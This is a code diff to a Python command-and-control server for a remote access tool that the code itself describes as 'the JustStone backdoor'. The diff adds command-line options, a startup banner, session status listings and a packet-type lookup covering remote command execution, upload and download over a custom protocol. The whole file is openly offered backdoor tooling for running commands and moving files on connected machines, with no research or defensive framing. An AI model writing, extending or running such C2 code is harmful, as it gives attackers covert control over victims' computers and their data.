@@ -1,18 +1,22 @@
 from StructureStone import *
 from dataclasses import dataclass, field
-from NetStone import StoneTransferProtocol, Protocol
+from NetStone import StoneTransferProtocol
 from MultiStone import *
-import asyncio, secrets, socket
-
+import secrets, datetime, argparse
 
 class Server:
-    def __init__(self, *address: list) -> None:
+    def __init__(self) -> None:
+        parser = argparse.ArgumentParser(description="""This program serves as an exclusive server for the JustStone backdoor. 
+                                         It utilizes a proprietary STP protocol and incorporates fundamental functionalities.""")
+        parser.add_argument('-a', '--address', type=str, help='Please enter the IP address of the PC to be used as the server. The default value is localhost.', default='127.0.0.1')
+        parser.add_argument('-p', '--port', type=int, help='Please enter the port number the server will use. The default value is 6974.', default=6974)
+        args = parser.parse_args()
         self.__STP = StoneTransferProtocol()
         self.thread = Thread()
         self.struct = ConstructStone()
         self.__Server_thread = threading.Thread(target=self.__run_service_handle, daemon=True)
         self.__Command_thread = threading.Thread(target=self.__handle_command, daemon=True)
-        self.__address = address
+        self.__address = [args.address,args.port]
         self.Sessions = set([])
         self.Session = None
         self.thread_q = []
@@ -23,23 +27,26 @@ class Server:
             "sessions" : self.__display_sessions, 
             "session"  : self.__display_session,
             "status"   : self.__display_server_status,
+            "help"     : self.__help 
             }
         print(f"""
             \r\n
-            =========================================
-                C&C Server Successfully Started!
-            =========================================
-
-            Server Status: Active
-            Version: [ 0.0.2 ]
-            Address: [ {self.__address[0]} ]
-            Port: [ {self.__address[1]} ]
-
-            The server is up and running smoothly. What would you like to do?
+            ===============================================
+            JustServer v0.0.1                   by 2QNRpDwD
+            ===============================================
+            [+] Server Status   : Active
+            [+] Address         : {self.__address[0]}
+            [+] Port            : {self.__address[1]}
+            ===============================================
+            {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} Starting JustServer
+            ===============================================
+            The server is up and running smoothly. 
+            What would you like to do?
             Type 'help' for assistance.
             Type 'shutdown' to shut down the server.
-
-            =========================================
+            ===============================================
+            https://github.com/3QNRpDwD/JustStone
+            ===============================================
             \r\n\r\n""")
         
     def run(self):
@@ -56,9 +63,8 @@ class Server:
         
         self.__STP.SetupConnection(*self.__address, 0)
         thread = self.thread.Constructor(self.__STP.ReceiveStone, self.__STP.client)  
-        self.Sessions.add(Session( self.__STP.client , thread ))
+        self.Sessions.add(Session( self.__STP.client , thread, "Connection"))
         thread.run()
-
         
     def __handle_command(self):
         while True:
@@ -83,6 +89,27 @@ class Server:
             
         exit()
         
+    def __help(self):
+        return "\n:>\n"
+        
+    def get_type(self, packet: StructStone):
+        match packet.header.StoneType:
+            case StoneTransferProtocol.Connection:
+                return "Connection"
+            case StoneTransferProtocol.Handshake:
+                return "Handshake"
+            case StoneTransferProtocol.HealthCheck:
+                return "HealthCheck"
+            case StoneTransferProtocol.ExecuteCmd:
+                return "ExecuteCmd"
+            case StoneTransferProtocol.Upload:
+                return "Upload"
+            case StoneTransferProtocol.Download:
+                return "Download"
+            case StoneTransferProtocol.Response:
+                return "Response"
+        return "Unknown"
+        
         
     def __client_command(self, cmd):
         if cmd == "close":
@@ -105,7 +132,6 @@ class Server:
                 f.write(self.packets[self.Session.SessionID].payload.file)
                 
             print(f"File {file_name} has been downloaded.\n")
-            
             
         elif cmd.startswith("upload"):
             file_path = cmd.split(" ")[1].replace("\\", "/")
@@ -136,13 +162,23 @@ class Server:
         
         
     def __display_sessions(self):
-        display_session = "\n====== [ Index ] ======== [ Address ] ============== [ ID ] ========="
+        len_sessions = len(self.Sessions)
+        if len_sessions == 0:
+            return "\nThere are currently no sessions connected.\n"
+        display_sessions = "\n=========================================================================="
+        display_sessions += f"\nConnected Sessions    : {len_sessions}   "
+        display_sessions += "\n=========================================================================="
+        display_sessions += f"\n{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} Starting display sessions"
+        display_sessions += "\n=======[ Status ]=============[ Address ]=============[ Sessions ID ]====="
         count = 0
         for Session in self.Sessions:
-            display_session += f"\n|      index : {count}      {Session.Address.getsockname()}     [ {Session.SessionID} ]  |"
+            address = f"{Session.Address.getsockname()}".replace("(", "").replace(")", "")
+            display_sessions += f"\n     [ {Session.Status} ]      [ {address} ]      [ {Session.SessionID} ]  "
             count+=1
-        display_session += "\n============================[ end ]==================================\n"
-        return display_session
+        display_sessions += "\n=========================================================================="
+        display_sessions += f"\n{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} Finished display sessions"
+        display_sessions += "\n==========================================================================\n"
+        return display_sessions
         
         
     def __display_session(self):
@@ -172,8 +208,8 @@ class Server:
     def __shutdown_command(self, cmd):
         if (len(self.Sessions) == 0 and cmd == "shutdown"):
             
-            print("\nThe server has shut down.\n")
-            self.__STP.socket.closed()
+            print(f"\n            {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} Finished JustServer\n            ===============================================\n")
+            self.__STP.socket.close()
             
             return True
         
@@ -181,7 +217,7 @@ class Server:
             
             for session in self.Sessions:
                 self.__STP.Disconnect(session)
-            print("\nThe server has shut down.\n")
+            print(f"\n            {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} Finished JustServer\n            ===============================================\n")
             
             return True
         
@@ -194,7 +230,7 @@ class Session:
     SessionID: str = field(init=False, default=None)
     Address: tuple
     Thread: None
-    # reader: None
+    Status: str
     # writer: None
 
     def __post_init__(self):
@@ -222,5 +258,7 @@ class SessionID:
         Generates the session token.
         """
         self.Token = secrets.token_hex(self.length)
-    
-Server("127.0.0.1", 6974).run()
+
+
+if __name__ == '__main__':
+    Server().run()
